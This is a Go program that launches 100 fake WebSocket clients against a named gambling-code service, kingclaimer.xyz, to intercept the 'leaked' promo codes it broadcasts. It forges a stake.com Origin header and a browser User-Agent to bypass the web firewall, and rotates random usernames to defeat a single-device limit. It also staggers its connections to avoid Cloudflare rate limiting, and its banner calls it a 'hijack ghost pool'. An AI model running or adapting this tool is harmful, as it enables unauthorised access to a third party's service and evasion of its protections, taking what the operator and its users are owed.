package main

import (
	"encoding/json"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/signal"
	"runtime"
	"runtime/debug"
	"sync"
	"syscall"
	"time"

	"github.com/gorilla/websocket"
)

// ==========================================
// CONFIGURATION (TUNED FOR 100 GHOST CONNECTIONS)
// ==========================================
var (
	SERVER_URL             = getEnv("TARGET_URL", "wss://kingclaimer.xyz:8443/")
	TOTAL_CLIENTS          = 100 // Kept reasonable to avoid triggering Cloudflare rate limits
	MAX_WORKERS            = 100 // Matches clients
	RECONNECT_DELAY        = 2 * time.Second
)

// Worker Semaphore to limit max workers
var workerSemaphore = make(chan struct{}, MAX_WORKERS)

// Global sync variables to print responses exactly ONCE
var (
	printHandshakeOnce sync.Once
)

func init() {
	// Seed the random number generator so usernames are always unique on every run
	rand.Seed(time.Now().UnixNano())
}

// ==========================================
// TOKEN + USERNAME GENERATORS
// ==========================================
func generateRandomUsername() string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyz0123456789")
	b := make([]rune, 8)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	// We use random names to bypass the "singleDevice: true" kick
	return "Ghost_" + string(b)
}

func getEnv(key, defaultValue string) string {
	if value, exists := os.LookupEnv(key); exists {
		return value
	}
	return defaultValue
}

// ==========================================
// CLIENT STRUCT
// ==========================================
type StressClient struct {
	clientID           int
	username           string
	ws                 *websocket.Conn // Replaced HTTP SID with pure WebSocket Connection
	connected          bool
	running            bool
	lastActivity       time.Time
	lock               sync.Mutex
}

func NewStressClient(id int) *StressClient {
	return &StressClient{
		clientID: id,
		username: "", // Will be generated fresh on every connect
	}
}

// Helper function to set WAF-bypassing headers
func getWAFHeaders() http.Header {
	headers := http.Header{}
	headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	headers.Add("Origin", "https://stake.com")
	return headers
}

func (c *StressClient) Connect() bool {
	// GENERATE FRESH IDENTITY FOR EVERY ATTEMPT
	c.username = generateRandomUsername()

	// ==========================================
	// 1. WEBSOCKET HANDSHAKE
	// ==========================================
	dialer := websocket.DefaultDialer
	dialer.HandshakeTimeout = 10 * time.Second

	ws, resp, err := dialer.Dial(SERVER_URL, getWAFHeaders())
	if err != nil {
		if resp != nil {
			log.Printf("[Client %d] Dial failed with status: %d", c.clientID, resp.StatusCode)
		}
		return false
	}

	c.ws = ws

	// ==========================================
	// 2. WAIT FOR "WELCOME" THEN SEND "REGISTER"
	// ==========================================
	ws.SetReadDeadline(time.Now().Add(10 * time.Second))
	_, welcomeMsg, err := ws.ReadMessage()
	if err != nil {
		c.Disconnect()
		return false
	}

	printHandshakeOnce.Do(func() {
		log.Printf("\n[+] FIRST SERVER WELCOME:\n%s\n", string(welcomeMsg))
	})

	// Construct the competitor's exact expected payload
	regPayload := map[string]string{
		"type":     "register",
		"role":     "claimer",
		"username": c.username,
	}
	
	err = ws.WriteJSON(regPayload)
	if err != nil {
		c.Disconnect()
		return false
	}

	// Reset read deadline for continuous listening
	ws.SetReadDeadline(time.Time{})

	c.lock.Lock()
	c.connected = true
	c.lastActivity = time.Now()
	c.lock.Unlock()

	log.Printf("[Client %d] Connected & Registered as %s", c.clientID, c.username)
	return true
}

func (c *StressClient) Disconnect() {
	c.lock.Lock()
	defer c.lock.Unlock()
	if !c.connected {
		return
	}
	if c.ws != nil {
		c.ws.Close()
	}
	c.connected = false
}

func (c *StressClient) Run() {
	c.running = true

	// Acquire semaphore slot
	workerSemaphore <- struct{}{}
	defer func() { <-workerSemaphore }()

	for c.running {
		c.lock.Lock()
		isConnected := c.connected
		c.lock.Unlock()

		if !isConnected {
			if !c.Connect() {
				time.Sleep(RECONNECT_DELAY)
				continue
			}
		}

		// ==========================================
		// 3. CONTINUOUS LISTENING & HEARTBEAT LOOP
		// ==========================================
		for {
			_, message, err := c.ws.ReadMessage()
			if err != nil {
				// Connection dropped, break to reconnect
				c.Disconnect()
				break
			}

			c.lock.Lock()
			c.lastActivity = time.Now()
			c.lock.Unlock()

			// Parse JSON to handle Ping/Pong and sniff codes
			var data map[string]interface{}
			if err := json.Unmarshal(message, &data); err == nil {
				
				// Handle Server Ping to keep connection alive
				if data["type"] == "ping" {
					c.ws.WriteJSON(map[string]string{"type": "pong"})
				}

				// DETECT THE LEAKED CODE
				if code, exists := data["code"]; exists {
					log.Printf("\n🔥 [Client %d] SNIPED DROP FROM KING: %v 🔥\n", c.clientID, code)
				}
				
				// Optional: Log errors if he kicks us
				if data["type"] == "error" {
					log.Printf("[Client %d] Server Error: %v", c.clientID, data["message"])
					c.Disconnect()
					break
				}
			}
		}

		// Required to prevent local script from OOM crashing
		runtime.Gosched()
	}
}

// ==========================================
// MAIN EXECUTION
// ==========================================
func main() {
	log.SetFlags(log.LstdFlags | log.Lmsgprefix)

	// Force Go to aggressively clean RAM to stay under 1GB
	debug.SetMemoryLimit(850 * 1024 * 1024) 
	
	// Optimize CPU usage
	runtime.GOMAXPROCS(runtime.NumCPU())

	log.Println("========================================")
	log.Println(" STARTING KING-CLAIMER HIJACK GHOST POOL ")
	log.Printf(" Target: %s", SERVER_URL)
	log.Printf(" Ghost Clients: %d", TOTAL_CLIENTS)
	log.Println("========================================")

	var wg sync.WaitGroup

	for i := 0; i < TOTAL_CLIENTS; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			client := NewStressClient(id)
			client.Run()
		}(i)

		// Small delay to prevent Cloudflare from seeing a massive instant spike
		time.Sleep(20 * time.Millisecond)
	}

	log.Println("All 100 Ghost clients deployed and listening...")

	done := make(chan os.Signal, 1)
	signal.Notify(done, os.Interrupt, syscall.SIGINT, syscall.SIGTERM)
	<-done

	log.Println("Stopping Ghost Pool...")
	wg.Wait()
}
